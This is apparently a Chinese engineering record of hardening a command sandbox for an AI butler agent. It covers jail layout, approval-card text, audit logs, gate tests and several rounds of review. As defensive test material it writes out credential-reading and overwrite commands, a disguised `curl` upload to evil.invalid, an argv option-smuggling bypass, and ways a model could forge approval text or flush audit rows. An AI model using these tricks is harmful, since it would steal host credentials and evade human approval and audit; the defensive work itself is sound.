- **文件四动作在监狱里做**（Codex 首轮 H3 的修法）：`hands_write/read/list/rm` 各 spawn 一次监狱内的
  `node -e <内嵌小助手>`（零依赖、一件事一次调用、结果一行 JSON），与命令同一份 hardening（离线 +
  藏同样的东西）。为什么不让 hub 自己 open：监狱里的命令能在检查与动手之间把目录换成指向 `<space>` 的
  链接（TOCTOU），hub 若以自己的权限 open 就会读走 vault、写坏 `agents.json`——`O_NOFOLLOW` 只守最后
  一段，Node 没有 `openat`；小助手在同一座监狱里，链接换过去内核照样拒（门：策略放行后把目录换成指向
  `<space>` 的链接，写不进 `agents.json`、读不出 `gotong.env`、列不出目录）。小助手内仍 `O_NOFOLLOW|
  O_NONBLOCK`（`O_NONBLOCK` 是因为监狱里的命令能 `mkfifo`，同步 open 一个 FIFO 会挂死）+ 前 8KB 嗅探
  二进制 + 超 256KB 只显示前段并注明；`hands_list` 排序、四类型、200 项顶（扫描顶 5000）；`hands_rm`
  拒工作区根、递归不跟链接。代价：每个文件动作一次 node 冷启动（≈50ms）。写前算配额（512MB 字节 +
  **100k 文件数硬顶**——字节配额挡不住「一百万个空文件」；`measureTree` **流式 `opendirSync`** 到顶即
  停——这是 hub 侧唯一碰工作区的只读动作，只数不读，链接换目录最多让计数失真）。
- **`hands_run`**：监狱内先套一层 `/bin/sh -c`：建 TMPDIR、`ulimit -c 0`（不出 core）、`ulimit -f
  ⌈配额/512⌉`（单文件不超工作区配额）、`ulimit -u 2048`（进程数封顶，每条 `2>/dev/null`——硬上限比要
  的低就保持原样绝不因此起不来），然后 `exec` 真命令。`detached:true` 自成进程组；**命令一退出就
  `kill(-pid, SIGKILL)` 收整个进程组**（Codex 首轮 M：后台 `&`/守护进程不该活过这一条命令——下一条动作
  开始时工作区里没有别人；门：`(sleep 3; echo alive > late.txt) & echo started` 后 late.txt 不出现）；
  超时/洪水同样收组；stdout/stderr 走 `TailBuffer` 只留尾 `maxOutputBytes`（默认 32KB），总量超 `64×`
  上限（2MB）**提前终止**；退出后再等 stdio 关闭最多 1s（逃出进程组的守护进程抓着管道不能无限等）；
  `stdin` 可选 ≤1MB，**进审批标题**（字节数 + 去控制字符的 80 字摘要——「联网执行 sh」加一段 stdin
  就能把整个动作藏在标题后面；Codex 首轮 M）；`timeoutSec` 钳到 `maxRunSec`；回执首行固定
  `exit N · 秒 · stdout B · stderr B · 联网/离线 · cwd`，非零/超时/超输出一律 `isError`。
- **审计** `<memberRoot>/audit.jsonl`（0600，>1MB 轮转成 `.1`）：每次动作一行——tool/code/tier/argv
  （单项截 200 字）/cwd/exit/signal/ms/字节数/timedOut/overflow/net/jail/**stdinBytes+stdinSha256**；写读
  只记 `{path, bytes}`。**不落 stdout/stderr/stdin 正文**（门：`printf AUDITBODY` 的回执有它、审计文件里
  没有；stdin 正文同样只有 sha256）。
- **并发 1/成员是 hub 级**：`BUSY` 是模块级 `Map`（键 `handsRoot::userId`）不是 toolset 实例态——同一成员
  在同一进程里被建了两份 toolset（会话窗与 IM 各一份）也只有一双手（Codex 首轮 M；门：另一份 toolset
  同样被拒「还在跑」）；在 `execute` 的同步前缀里置位，第二条动作来了响亮拒不排队。
- **接线**：factory 只在 `deps.hands?.host` 在场时把五工具并进 governed 面（`my_status` 多一行「手：
  已装(bwrap)/未装(原因)」；B1 能力清单 `hands_run/hands_write` 信号）；main.ts +4 行 `armButlerHands`
  （棘轮 2770→2780 显式抬，理由记 gate）。**缺席字节不变**在 tiers 测试里是结构性断言：dep 不传 ≡
  `armed:false` ≡ armed 面 − hands_* 五个名字。
- **备份**：`gotong backup` 全量档跳过 `butler/hands/user/<id>/workspace/**/node_modules`（walk 时剪枝
  + staging 过滤两层同一个 `isHandsScratchPath`）；源码/审计照进；别处同名目录照进（`workflows/
  node_modules/keep.txt` 门）；tier 档白名单本就不含 hands。

### 10.2 门（doc §六 M2 行逐条）

本机 macOS `sandbox-exec` 真 spawn 全过（`personal-butler-hands.test.ts` **68 例**，其中 22 例真 spawn；
另有审批文案的两道专属门 `approval-text.test.ts` 14 例 + `approval-copy-shared.test.ts` 4 例，
以及 IM 投影侧的 `im-approval-service.test.ts` 16 例）；bwrap 由 argv 顺序单测钉死
（`--tmpfs <hidden>` 早于 `--ro-bind` 早于 `--bind`、`--ro-bind /dev/null <file>` 与 `--remount-ro`
晚于、`--unshare-net/--unshare-pid` 在场），Linux 真机跑一次即成事实（`HANDS_TEST_REQUIRE_JAIL=1` 让
无监狱的机器整文件红而不是静默 skip——CI 用）。

| 门 | 证据 |
|---|---|
| `cat <space>/gotong.env` 失败 | 监狱内 `cat` 出码非 0，回执零 `SECRET`；`hands_read ../../../../../gotong.env` classify refuse；`sh -c 'ls <space>'` 看不到 `agents.json` |
| 写 `<space>/agents.json` 双拒 | 监狱内 `echo pwned > <space>/agents.json; echo rc=$?` 不是 `rc=0` 且文件字节不变；`hands_write` 穿越 refuse；工作区内 `mkdir -p sub && echo hello > sub/note.txt` rc=0 且 `hands_read` 读到 |
| HOME / 点名文件藏起来 | 假 HOME（探针缝）里的 `.ssh/id_test`/`.netrc` `cat` 不吐值、`ls -A` stdout 列不出名字；`hidden` 点名的 `etc/gotong.env` `cat` 不吐值（bwrap 是 /dev/null 盖住、seatbelt 是 deny——两种都不吐）；没点名的地方照常可读（监狱藏的是 hub 的凭证不是整台机器）；**真探针**形状藏起 hub 真 HOME 后 `node -e` 照跑（前缀再放开只读）、PATH 里落在 HOME 的项只剩再放开的、文件小助手照常写 |
| TOCTOU 真闸 | 策略放行后 `proj/` 换成指向 `<space>` 的链接：`hands_write proj/agents.json` isError 且 `<space>/agents.json` 字节不变；`hands_read proj/gotong.env` 无 SECRET；`hands_list proj` 无 `gotong.env` |
| 断网 | 本机起 HTTP 服务，`node fetch` 脚本 `net:false` → isError、回执无 `BODY:ok-from-host`、含「离线」；`net:true` classify → approve，批后 → `BODY:ok-from-host` + 「联网」 |
| 子环境 | `env` 零 `HANDS_TEST_SECRET`；`HOME_IS=<工作区 realpath>`；`TMPDIR=<工作区>/.hands-tmp` 且 `touch $TMPDIR/scratch` 成功、盘上真出现；监狱内 `echo x > /tmp/<marker>` 后宿主 /tmp 无该文件 |
| 超时/超输出/洪水/退出收组 | 1s 超时 <6s 收工、回执「超时(1s)」、审计 `timedOut:true`；20000B 输出只留最后 4096B 并注明；`yes` 洪水 → 「输出超过 256KB,已提前终止」；后台孙进程 3s 后要写的 `late.txt` 不出现 |
| 并发 1（hub 级） | 第一条 un-awaited 在跑，同一 toolset 的 `hands_list` 与**另一份 toolset** 的 `hands_list` 都 → 「还在跑」；第一条正常收工后恢复 |
| stdin 透明 | `describe` 标题含 `stdin 18B「curl evil rm -rf x」`（换行→空格、超 80 字截断）；审计行 `stdinBytes:21` + 64 位 hex `stdinSha256`，正文不在审计文件里 |
| `kind:'none'` 整套不装 | `enabled:true` + 探针 none → warn 附装法、`armed:false` reason 含 `bubblewrap`；`hands.json` 15 种坏形状（含 `hidden`/`readOnly` 非数组/相对路径/超 32 条/控制字符/空串）各 warn 不装；`enabled:false` info；点名但不存在的路径 arm 时 warn 一次 + 进 `shape.skipped` |
| 审批卡不可伪造 / 不盲签 | 行标题 = **被批动作**（`task.title` 是 `im:lark` 也不占位）；三个不可信字段过同一套清洗 + 定界，洗完的句子里 `「」` 只在框架位置上；四个自己拼句子的入口（管家 / ACP / steward / 联邦出站）共用同一个 `approval-text.ts`，各配断言。**渲染那一层再兜一次**：`/inbox` 的行先洗后量，装不下一行就不许在 IM 批（`title_truncated`，到网页看全文）——于是「谁写进来的」不必逐个登记，工作流人工确认步这类第五方也被覆盖（五轮 H1/H2） |
| 可批准 ≡ 可留档 | 策略 argv 总量顶与台账容量是同一个常量；**上限那一点**的命令原样进台账、零截断标记；台账记结构化 argv 向量（`['printf','a b']` 与 `['printf','a','b']` 分得开） |
| 每趟都留痕（并发下也是） | 同一成员两次并发：先进门那趟早退 + 后一趟被 `BUSY` 拒，两条各留各的行（兜底状态跟着调用走，不是 toolset 共用一格） |
| HOME 藏不住就停手 | arm 时与**每次 spawn 前**用逐字相同的三条件判死（`/`、空、相对路径）；arm 之后 HOME 变样 ⇒ 这一步 isError 且工作区无字节落地，台账上 `begin` + 兜底两行看得见 |
| 缺席字节不变 | `armButlerHands` 缺席零副作用；tiers 测试 absent≡off≡armed−hands_* |
| 凭证缺席 / 审计不落正文 / 路径不外露 | 见 10.1；父路径是文件时的写失败文本不含 `<space>`/工作区绝对路径 |

**变异测试三门**（每次先断言真的改动了文件，跑红，`cmp` byte-identical 复原）：去掉 `hiddenPaths`
→ 门①②红（正是 10.1 说的 essential-writable 坑）；`unshareNet` 恒 false → 断网门红；去掉 `busy`
判断 → 并发门红。core 侧 seatbelt 规则由真机探针脚本逐条证实后才写进 `MAC_PROCESS_ISOLATION`。

### 10.3 前置备忘四条的回答（§九）

1. TOCTOU：**文件动作搬进监狱**（小助手）是真闸；并发 1（hub 级）+ 每次结束 `kill(-pid)` 整进程组 +
   Linux `--unshare-pid` + `O_NOFOLLOW` 是缩窗；**残余如实**：macOS 无 pid 命名空间，`setsid` 双 fork
   的守护进程活得过一次运行（stdio 1s 宽限保证 hub 不被它拖住）——但它能碰的只剩本成员自己的工作区
   （其他成员的工作区与 `<space>` 它一样进不去）。
2. `--tmpfs <space>` + seatbelt `deny file-read*/file-write*`：落地为 core `hiddenPaths`（见 10.1），且
   扩到 HOME/点名文件/再放开只读。
3. `unshareNet` 等 additive：落地为 `FsJailHardening` 六键，缺席 = 经典 argv/profile 逐字节一致
   （core 单测钉 `hardening:{}` 与不传同形）——本 track 唯一 core 触碰。
4. 备份排除：落地（10.1 末条）；档案 note 未写（工作区本身仍进档，只少 `node_modules`，恢复后
   `npm install` 一次即回，不值一条 note）。

### 10.4 诚实残余

- **藏起来的以外的宿主文件系统监狱里可读**（系统目录、`/opt`、`/etc` 里没点名的、其他用户 0755 的家）
  ——「凭证结构性缺席」说的是 hub 自己的凭证（`<space>`、HOME、点名文件），不是整台机器；把 hub 用户的
  凭证放在 HOME/`<space>`/`/etc/gotong.env` 之外的操作者要用 `hands.json` `hidden` 点名。
- 配额是**动作前丈量**不是运行期硬界：命令跑着的时候能把盘写到 `ulimit -f`（单文件 = 配额）的上限
  数倍；内存不设界（无 cgroup）；bwrap 私有 `/tmp` tmpfs 无大小上限（洪水写能吃 RAM 到超时/收组）。
  且 **`ulimit` 三条都是软的**：每条带 `2>/dev/null`，硬上限比要的低（或 shell 不认 `-u`）时**保持
  原样继续跑**——绝不因为压不下限额就让命令起不来。它们是「别把机器拖垮」的兜底，不是承重门；承重的
  是时限、输出顶、退出即收组和监狱本身。
- macOS：孙进程只要自己 `setsid()` 就脱离进程组，**命令退出时的 `kill(-pid)` 收不到它，它会一直活着**
  （Linux 侧 `--unshare-pid` 使 pid 命名空间 init 一退整片被内核清掉，无此残余）。试过的清扫办法都不成立
  ——`ps -E` 在本机不吐同 UID 分离进程的 env，认不出「这是手起的」，宁可如实记档也不做会误杀用户进程的
  按名清扫。开发机的 `/dev/ttys*` 在监狱里可写（`/dev` 是 essential-writable）；同 UID 其他进程的 argv 经
  `kern.procargs2` 仍可见（env 不可见——真机探针证）；Mach/XPC 面没有逐服务收窄（keychain 靠藏 HOME 挡，
  `launchctl` 起后台任务在 macOS 26 被 launchd 自己拒掉 —— `(deny job-creation)` 是第二把锁）；BSD
  `mkdir -p` 用**绝对路径**穿藏起来的祖先会 EPERM（用相对路径；Linux bwrap 无此问题，tmpfs 挂载点存在）。
  生产 = Linux，这些是开发机注脚。
- 审计台账轮转只留一代 `.1`，阈值从策略层的 argv 上限推出来（≈7.5MB，见 §10.5 五轮 M3）。**动手前**会真落一行 `begin`（写不成就 fail-closed 拒绝，见 §10.5 三轮 M5），但
  **事后** append 失败（盘刚好满在这一瞬）只 warn——动作已经发生，拒绝收不回。`begin` 那行的承诺**只到
  进程崩溃**：`appendFileSync` 不 fsync，整机断电时它可能还在页缓存里没落盘，故这条不承诺断电语义
  （四轮确认；要断电语义得每行 fsync，那是给每次动手加一次同步刷盘的代价，这双手不值这个价）。
  轮转本身天生是个**窗口**：发足够多顶格 argv 的动作仍能把旧行推出去（阈值 ≈7.5MB ≈ 40 条顶格动作
  或两万多条正常动作）。挡不住，只能让它变贵且留痕——那些动作每一条自己都先被记了下来（五轮 M3）。
- 审批标题里的命令到 600 字符为止，超出明说「共 N 字符，已截断，完整命令见审计台账」——**兑现得了**：
  分级那一刻的 `classify` 行带完整 argv，且策略层的 argv 总量顶（16KB）与台账的容量是**同一个常量**
  （四轮 H2），于是「可批准的命令」必然是「可留档的命令」。stdin 摘要到 240 字符为止，截断处只说「共 N 字符，已截断」
  **不指台账**——台账只留 `stdinBytes`+`stdinSha256`，正文永不落盘，指向一个并不存在的「完整内容」
  比不指更坏。所以 stdin 超过 240 字符时，批的人看到的确实只有开头：这是刻意的取舍（正文进台账
  = 密码、token 从此有第二份落盘副本），把它写在这里而不是假装没有。
- 真 bwrap 机器上的 spawn 门待 Linux 真机跑一遍（argv 已单测钉死；M6 一键镜像的 CI 就是那台机器）。

### 10.5 Codex 交叉审账（gpt-5.6-sol，四轮）

首轮结论「修了再提交」5H/4M/1L，逐条对源码核实后**全部修入**（复审见本节末）：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | 只藏 `<space>`：生产 `gotong.env` 在 hub 用户 HOME 下，`~/.ssh`/`~/.netrc`/`/etc/gotong.env`/docker 套接字监狱里全可读 | 默认藏 HOME+`/home`+`/root`+`/run/user`+`/etc/gotong.env`+容器套接字（存在才盖），`hands.json` `hidden`/`readOnly` 可追加；落在 HOME 里的 node 前缀再放开只读；PATH 同步过滤 |
| H2 | 高 | seatbelt 侧 `unsharePid` 空转：监狱内可 `kill <hub pid>`、经 LaunchServices/AppleEvents 在监狱外起进程 | core `MAC_PROCESS_ISOLATION` 六条规则（真机探针逐条证：无过滤 `(deny signal)` + same-sandbox allow / `process-info*` 同型 / `(deny lsopen)` / `(deny appleevent-send)`） |
| H3 | 高 | 文件四动作 hub 侧 open：目录在检查后被换成指向 `<space>` 的链接时 `O_NOFOLLOW` 只守最后一段 | 文件动作全部搬进监狱内的 node 小助手（同 hardening），hub 不再以自己权限碰工作区字节 |
| H4 | 高 | 共享 `/tmp`（seatbelt essential-writable）是同机进程通道 | `denySharedTmp` + `TMPDIR=<workspace>/.hands-tmp`（监狱内 shell 前奏建） |
| H5 | 高 | 命令正常退出后后台孙进程活着（只在超时/洪水才收组） | `exit` 事件即 `kill(-pid)`（bwrap 下 = 整个 pid 命名空间） |
| M1 | 中 | `busy` 是 toolset 实例态，同一成员两份 toolset 各一双手 | 模块级 `BUSY` Map 按 `handsRoot::userId` |
| M2 | 中 | stdin 不进审批标题/审计 | 标题 `stdin NB「摘要」`；审计 `stdinBytes`+`stdinSha256` |
| M3 | 中 | 代理变量含 `user:pass@` 也是凭证 | `proxyUrlHasUserinfo` 过滤 |
| M4 | 中 | 无 ulimit：core dump/单文件洪水/fork 炸弹只靠时限兜 | 监狱内 `ulimit -c 0 -f ⌈配额/512⌉ -u 2048` |
| L1 | 低 | 错误文本回显 hub 绝对路径；`measureTree` `readdirSync` 整表进内存 | `redact()` 占位；`opendirSync` 流式 |

被证伪一条（不改）：「firmlink 别名绕过 seatbelt 路径匹配」——真机探针：seatbelt 按规范 vnode 路径
匹配，`deny (subpath /Users/x)` 同时盖住 `/System/Volumes/Data/Users/x`；反向（`/tmp/x` 不盖
`/private/tmp/x`）由 `variants()` 双拼写解决。

**二轮**（对首轮修完的代码再审）结论同样是「修了再提交」，逐条核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| S1 | 高 | **首轮的藏法把工作区自己也藏了**：`hiddenPaths` 与再放开的根按「种类」分组发，藏的那组落在放开之后，两个执行器（SBPL 末条胜、bwrap 后挂盖前挂）都按**顺序**裁决 ⇒ 藏 HOME 会连同 HOME 下的工作区/node 前缀一起盖掉，手直接瘫；反过来把藏的提前又会让 HOME 整个敞开 | core 新 `planJailLayers`：按**路径深度排序、深的后发**（同深按 只读<读写<藏 排），于是「藏 HOME → 放开工作区 → 藏工作区里的点名文件」三层交替能表达；已经落在某条**更浅（或同深）的藏**里、且两者之间没有再放开的藏条目是多余的，剪掉（`isSwallowedByHidden`：有更深的再放开插在中间就**不**剪——那条藏正是要把再放开的东西重新盖回去的）；`hardening` 缺席时逐字节走老路径 |
| S2 | 高 | macOS 侧没拦 launchd：`launchctl submit` 能把活儿甩到监狱外 | `(deny job-creation)`（真机探针：macOS 26 的 launchd 本就拒绝沙箱内客户端建 job，这是第二把锁）；Mach/XPC 未逐服务收窄 = 开发机残余（§10.4） |
| S3 | 中 | 文档说 macOS 分离守护「活到下一条命令」——不对 | 改口：`setsid()` 的孙进程**一直活着**，试过的清扫办法都不成立（§10.4） |
| S4 | 中 | 审批标题截到 120 字符且不说截了多少：`sh -c` 的真动作常在 120 字之后 ⇒ 人批的是省略号 | 命令 600 / stdin 240，截断处附「共 N 字符，已截断，完整命令见审计台账」，并把 **cwd** 写进标题；标题统一过 `titleSafe`（控制字符 + bidi 覆盖洗成空格——标题原样进 IM 一行字，不洗就能伪造） |
| S5 | 中 | 监狱形状是 boot 快照：boot 后才出现的 `~/.aws`、后装的 docker 套接字永远藏不上 | `ButlerHandsHost.probe` 存下来，每次 spawn 重问一次「在不在」（藏什么的**清单**仍是 boot 决定，只有存在性重探） |
| S6 | 中 | `hands.json` 能把监狱拆了：`readOnly:["/"]`、`readOnly` 盖住 `<space>`、`hidden:["/"]` | 新 `hardeningProblem()`：这几种形状一律**不装手**并 warn 说明（fail-closed，与「探针 none 整套不装」同姿态）；HOME **里面**的 nvm/.cargo 仍可放开 |
| S7 | 中 | `proxyUrlHasUserinfo` 走 `new URL()`，认不出 curl/git/pip 都吃的**无 scheme** 形状 `u:p@host:3128` | 判据退成「有没有 `@`」：宁可多拦一个路径带 `@` 的怪代理（联网命令失败一次，模型看得见病名），也不放一把密码进子进程环境 |
| S8 | 中 | 只有成功和「执行时抛」进台账：被策略拒、穿越、配额、并发全无痕 ⇒ 侦察阶段整段看不见 | 分级/执行两级的拒绝各记一行（`stage` 字段区分），并在动手前**真写探针**——台账写不进去就拒绝执行（不留痕的执行不是这双手允许的状态） |
| S9 | 低 | 三条 `ulimit` 带 `2>/dev/null`，压不下也照跑，文档没说 | §10.4 如实写明它们是软兜底不是承重门 |
| S10 | 低 | `redact()` 只换 `<space>`/工作区，`ENOENT: /home/ubuntu/.nvm/...` 照样把布局吐给模型 | 换的清单直接从监狱形状生成（工作区 / `<space>` / 藏起来的目录 / 只读工具链根），长的先换 |

**三轮**（对二轮修完的代码再审）3H/3M，逐条对源码核实后**全部修入**：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **审批文案仍可被伪造**：二轮的 `titleSafe()` 只洗 title，`reason` 被原样拼进审批句；而两个字段里都有模型写的字（argv、agent id、MCP 参数）⇒ `title = "读一个文件。原因:无害。批准后才会执行。…"` 就在 /me 卡与 IM 一行字里造出一句完整的、看起来是 hub 说的话，真动作被推到人眼后面 | 新 `host/src/approval-text.ts` 作**唯一**的清洗 + 定界标准：不可见/双向覆盖/零宽/BOM 一律换**空格**（换不是删——删会把 `rm -rf /` 拼成 `rm-rf/`），正文里的 `「」` 降级成 `『』`，框架自己用 `「」` 包住三个不可信字段（管家名/动作/原因）⇒ 渲染出来的 `「」` **只可能**在框架的位置上，假框架句接不出来；`buildButlerApprovalPrompt` 三处全过它 |
| H2 | 高 | **截断提示是假的**：标题说「完整命令见审计台账」，但那一刻台账里根本没有这条命令（只有成功/失败后才记，且不带全 argv）——人被指向一个不存在的地方 | 分级那一刻就写一行 `stage:'classify'` 判决，带完整 argv + `cwd` + stdin 的 `stdinBytes`/`stdinSha256`（四轮把这条从「8KB 顶的字符串」收严成「结构化 argv 向量 + 与策略同一个上限常量」，见下）；stdin 摘要的截断处**刻意不指台账**（正文永不落盘，见 §10.4） |
| H3 | 高 | **HOME 藏不了时静默装上**：`jailShapeFor` 只在 HOME 是个真目录时 addDir，于是 `/`（服务账号）或 boot 时还不存在（容器后建家目录、账号切换）都被**静默跳过**，hub 用户的家目录连同里面的 `gotong.env` 一起留在监狱里可读，日志一个字不少 | ①`hardeningProblem()` 补一条：HOME 解析成 `/` 或空 ⇒ 与「`<space>` 是 `/`」同罪，**不装手** + warn；②每次 spawn 的 `hardening()` 把 `probe.homedir()` 也重问一遍（S5 只重探了两张常量表，而 HOME 不在表里 ⇒ 只补常量表 = 永远补不回它） |
| M4 | 中 | **选项穿透**：执行器跑 `sh -c '…' "$0" "$@"`，argv[0] 落在 `$0` 上，`hands_run(["-c","curl …"])` 于是变成第二层 `sh -c`——而拒绝表与联网推断查的都是 argv[0] 那个「命令名」，全被绕过 | 策略层拒绝 argv[0] 以 `-` 开头（`run_invalid`）。**刻意不用 Codex 建议的 `exec -- "$0"`**：实测 `/bin/dash -c 'exec -- "$0" …'` 报 `exec: --: not found` rc=127，而 Linux 的 `/bin/sh` 通常正是 dash ⇒ 那样修会把整条 Linux 路径打死（本条已回报 Codex） |
| M5 | 中 | **写得进去的证据是假的**：`auditProblem()` 用零字节 `appendFileSync(p,'')` 探针，它证明的是「那一刻能打开」，不是「这一行落了盘」；只读文件系统上甚至不一定失败 | 探针整个删掉，改成动手前真落一行 `stage:'begin'`——**写成了才动手**，写不成 `refuse`/`isError` 并说「审计台账写不进去」。它同时是崩溃/断电时唯一的线索：只有 `begin` 没有结果的那一行，说的正是「开始了，没回来」 |
| M6 | 中 | **早退的失败一个字不留**：四个文件动作只在成功那条路上记账，「不是目录」「不存在」「监狱不让」「内容太大」全无痕 | 不在七八处早退各补一行（下一个早退又会漏），而在动作回来那一刻**数**：这一趟一行都没记 → 补一行兜底。台账的合同是「每次动手都有痕」，不是「每处记得写」 |

三轮的六条各配一道会红的门，六次变异测试逐条按预期变红后复原 byte-identical（H1 去掉定界 ⇒ 4 例红；
M4 去掉守卫 ⇒ 1 例红；H3a 去掉 HOME 判死 ⇒ arm 门红；H3b 去掉每次 spawn 重问 HOME ⇒ **真 spawn 门里
`.netrc` 的密码当场泄出来**；M6 去掉计数兜底 ⇒ 早退失败无痕）。

**四轮**（对三轮修完的代码再审）3H/3M，逐条对源码核实后**全部修入**：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **盲签**：IM 的 `/inbox` 一行只渲染 `item.title`，而 park 出来的 item 用的是**任务**的 title——生产 IM 任务的 title 是传输标签 `im:lark`。手机上批的人于是看到「im:lark」四个字就要按批准，动作本身一个字都没有 | 行标题改取**被批动作自己的**标题（它已过同一套清洗+定界），`task.title` 不再有资格代表动作。**这一轮只改到了管家与 ACP 两处**：steward 与联邦出站当时仍在写 `task.title`（那也是传输标签），五轮 L 才补完——见下 |
| H2 | 高 | **「完整命令见审计台账」仍可能落空**：三轮把 argv 记进 `classify` 行，但那是个 8KB 顶的**拼接字符串**——策略允许的命令可以比它长（于是被截，指路又成空头支票），且 `['printf','a b']` 与 `['printf','a','b']` 拼出来一模一样（台账认不出真跑的是哪条） | 两刀：①策略层新增 argv **总量顶** `maxArgvTotalChars`（16KB），超了当场拒并指「写成脚本文件再跑」；②台账改记**结构化 argv 向量**，容量常量直接取策略那个顶（`AUDIT_ARGV_CHARS = HANDS_LIMITS.maxArgvTotalChars`）⇒「可批准的命令」≡「可留档的命令」，截断分支自此结构上到不了（留着是防御性的），门于是钉**上限那一点**：最大的那条可批准命令原样进台账、零截断标记 |
| H3 | 高 | **审批文案的标准只有管家一处在用**：三轮的 `approval-text.ts` 是为管家写的，而 hub 里还有三处自己拼审批句——ACP 破坏性动作（`tool.title` 由**对端 coding agent** 送来，比管家的字段更不可信）、steward 配置动作、联邦出站 | 四个入口全部改走同一个 `approval-text.ts`；新增 `approval-copy-shared.test.ts` + ACP 侧断言，把「全仓只有一处答案」这句声称本身变成会红的门（洗完的句子里框架定界符 `「」` 只可能出现在框架自己的位置上） |
| M4 | 中 | **兜底记账问错了问题**：`recorded` 是 toolset 作用域的计数器，答的是「有没有人记过」，要问的是「**我这一趟**记过没有」。同一成员两次调用并发到同一份 toolset 时，第二次被 `BUSY` 拒——**而那次拒绝也写一行**——于是第一趟早退回来时看到「记过了」，把自己那条失败漏掉 | `AsyncLocalStorage` 让这格状态跟着调用走，整个 `execute` 跑在它的作用域里；并发的另一趟拿的是另一格 |
| M5 | 中 | **HOME 判死只判了 boot 那一刻**：三轮 H3b 每次 spawn 重问 HOME，但只用它去 addDir——重问的**意义**就在于它会变，变成 `/`/空/相对路径时那个循环静默跳过，命令照跑而家目录没藏（正是 arm 时判死要避免的状态，只是晚了一步发生） | 每次 spawn 前用**与 arm 时逐字相同的三个条件**现判死，不合格当场抛（这一趟仍留痕：`begin` 一行 + 兜底一行）；顺手把 arm 侧也补上「相对路径同罪」——否则两处在判同一件事却判得不一样 |
| M6 | 中 | **定界符只挡了一种写法**：`「」` 有 NFKC 等价的相似字（半角 `｢｣`、竖排 `﹁﹂`），拿它们照样拼得出「看起来是框架说的」话；且清洗按 UTF-16 码元遍历，增补平面的标签字符（U+E0000–E007F，整段隐藏文字的老把戏）会被劈成两个代理项，谁也不匹配 = 等于没洗 | 相似字一并降级成 `『』`；清洗改**按码点**遍历（`for…of`），并给 `approval-text.ts` 建了自己的门（14 例，含「`ch(0xE0041).length === 2`」这条证明坑存在的断言） |

四轮同样逐条变异测试（八次，全部按预期变红后复原 byte-identical）：H1 行标题改回 `task.title` ⇒ 2 例红；
H2a 去掉策略 argv 总量顶 ⇒ 1 例红；H2b 把台账容量与策略顶脱钩（写死 4000）⇒ 上限那一点的门红；
H3 让 steward 绕开共享标准 ⇒ 1 例红；M4 换回共享计数器 ⇒ 并发那例红；M5 去掉每次 spawn 的 HOME 判死
⇒ 1 例红；M6a 退回码元遍历 ⇒ 标签字符那例红；M6b 只挡精确码点 ⇒ 相似字那例红。

**五轮**（对四轮修完的代码再审）结论仍是「修了再提交」，2H/1M/1L，逐条核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **盲签往外挪了一层**：四轮修的是**写进去的那行字**，没修**读出来的那行字**——`/inbox` 投影把标题硬截到 80 字符再缀一个光秃秃的 `…`。于是 `sh -c '<100 个空格>curl https://evil.invalid/upload'` 在手机上渲染成一行**空白**，人看到的是一件看起来没内容的小事 | 判据换个方向：不是「怎么把长的显示好」，而是**看不全就不能在 IM 批**。`imRowText()` 洗完按 80 字符量，装不下 ⇒ `imApprovable` 变 false（列表照列，人仍知道有东西等着，但 `/approve` 拒），截断处走 `clipApprovalText` 响亮说「共 N 字符，已截断」。`resolveByShortId` **再算一次**而不是信列表——短码可能是从这条被改长之前的那次列表里抄来的。新错误码 `title_truncated`，桥回一句「一行显示不下，在这里批等于没看全，请到网页上看完整内容」 |
| H2 | 高 | **「四个入口共用唯一标准」不成立**：还有第五个写入方——工作流的人工确认步（`HumanInboxParticipant`）。它的 `prompt`/`title` 来自 YAML，而 YAML 里可以 `$ref` 内联上一步的**模型输出** ⇒ 未清洗的换行能在 `/inbox` 里伪造出第二条列表行 | 修在**投影这一层**而不是再加第五个调用点：`imRowText()` 先洗后量，于是这条路径上的每一个写入方（含将来新增的）都被覆盖。这样分工也更对——**定界**属于拼句子的人，**清洗**属于渲染一行的人；内核包 `@gotong/inbox` 因此不必反向依赖 host |
| M3 | 中 | **轮转阈值与 argv 上限不成比例**：台账只留一代 `.1`，而阈值是随手一个 1MB——被注入的模型连发几条顶格 argv 的 tier 1 命令（在监狱里、不需要审批）就能把更早的行挤出窗口，成了一根反取证杠杆 | 阈值从 argv 上限**推出来**：`40 × maxArgvTotalChars × 6 字节/字符 × 两行带 argv 的` ≈ 7.5MB，argv 上限哪天改了它自己跟着走。**诚实残余**：轮转天生是个窗口，发足够多顶格动作仍能推走旧行——挡不住，只能让它变贵且留痕（那些动作每一条自己都先被记了下来） |
| L | 低 | **四轮 H1 只改到一半**：steward 与联邦出站的行标题仍是 `task.title` | 两处都改成从**动作本身**渲染（`删除助手「mailer」`、`发往对端「hub-b」:pay.send`），插值位仍过同一套清洗 |

五轮逐条变异测试（五次，全部按预期变红后复原 byte-identical）：H1a 去掉 `row.complete` ⇒ 截断那例红；
H1b 关掉 resolve 侧完整性门 ⇒ 拒批那例红；H2 让 `imRowText` 不洗 ⇒ 2 例红；L 两处行标题各自改回
`task.title` ⇒ 各 1 例红；M3 换回写死的 1MB ⇒ 轮转那例红。**M3 那次变异第一遍没红**——测试只证了「超过阈值
会轮转」，而 1MB 同样会轮转；补上「差一个字节到阈值就**不**该轮转」这半边才真的钉住了阈值本身。
变异测试自己也要被验证：它没变红时，先怀疑门而不是怀疑变异。
